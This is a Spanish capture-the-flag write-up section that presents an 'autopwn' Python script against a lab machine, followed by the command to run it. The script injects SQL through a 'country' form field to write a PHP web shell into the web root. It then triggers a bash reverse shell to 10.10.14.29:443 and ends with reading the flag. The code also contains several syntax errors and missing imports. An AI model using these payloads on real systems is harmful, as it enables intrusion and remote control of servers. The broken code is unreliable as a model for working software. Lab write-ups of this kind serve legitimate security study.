## Vuln exploit & Gaining Access {-}

### Ganando acceso con el autopwn {-}

```python
#!/usr/bin/python

from pwn import *
import signal, pdb, requests

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

#Ctrl+C
signal.signal(signal.SINGINT, def_handler)

if len(sys.argv != 3:
    log.failure("Uso: %s <ip-address> filename" % sys.argv[0]
    sys.exit(1)

#Variables globales
ip_address = sys.argv[1]
filename = sys.argv[2]
main_url = "http://%s/" % ip_address
lport = 443

def createFile():

    data_post = {
        'username': 'caa',
        'country': """Brazil' union select "<?php system($_REQUEST['cmd']);?>" into outfile /var/www/html/%s-- -""" % (filename)
    }

    r = requests.post(main_url, data=data_post)

def getAccess():
    data_post = {
        'cmd': "bash -c 'bash -i >& /dev/tcp/10.10.14.29/443 0>&1'"
    }

    r = requests.post(main_url + "%s" % filename, data=data_post

if __name__ == '__main__':
    createFile()
    try:
        threading.Thread(target=getAccess, args=()).start()
    except Exception as e:
        log.error(str(e))
    shell = listen(lport, timeout=20).wait_for_connection()
    shell.interactive()
```

 lanzamos el script

```bash
python autopwn.py 10.10.11.116 setenso.php
```

Y ganamos acceso a la maquina. Como usuario www-data podemos leer la flag.

